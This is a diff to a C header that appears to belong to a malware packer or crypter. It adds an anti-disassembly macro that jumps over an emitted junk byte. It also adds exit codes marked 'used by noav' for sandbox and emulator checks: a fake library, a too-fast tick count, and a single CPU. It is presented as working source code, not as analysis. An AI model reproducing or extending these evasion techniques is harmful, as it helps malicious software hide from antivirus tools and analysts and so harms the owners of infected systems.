@@ -19,6 +19,16 @@
 #define DEBUGMSGEXT(msg)
 #endif
 
+#define ASMGARBAGE __asm { \
+	PUSH EAX; \
+	XOR EAX,EAX; \
+	JZ J; \
+	MOV EAX,[SP+0x04]; \
+	__asm __emit(0x3F); \
+	J: \
+	POP EAX; \
+}
+
 /******************************************************************************
 * Preprocessor Directives and Macros
 *****************************************************************************/
@@ -38,11 +48,23 @@
 #define UTC_TIME_DIFF 120
 
 // Exit code, internal use only ;-)
-#define EXIT_CODE_ASKED_BY_MASTER (0x0000)
-#define EXIT_CODE_TIME_WARP_NULL  (0x0001)
-#define EXIT_CODE_TIME_WARP_2015  (0x0001 << 1)
-#define EXIT_CODE_TIME_WARP_NTPD  (0x0001 << 2)
-#define EXIT_CODE_ERROR_NTPD      (0x0001 << 3)
+// used by noav
+#define EXIT_CODE_ASKED_BY_MASTER		(0x0000)
+#define EXIT_CODE_TIME_WARP_NULL		(0x0001)
+#define EXIT_CODE_TIME_WARP_2015		(0x0001 << 1)
+#define EXIT_CODE_TIME_WARP_NTPD		(0x0001 << 2)
+#define EXIT_CODE_ERROR_NTPD			(0x0001 << 3)
+#define EXIT_CODE_FAKE_LIBRARY_LOADED	(0x0001 << 4)
+#define EXIT_CODE_TICK_COUNT_TOO_QUICK	(0x0001 << 5)
+#define EXIT_CODE_ONLY_ONE_CPU			(0x0001 << 6)
+
+// Memory size
+#define KiloByte (1024)
+#define MegaByte (1024*1024)
+#define GigaByte (1024*1024*1024)
+
+//
+#define ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING 42
 
 // Crypt function to activate
 #define NO_CRYPT
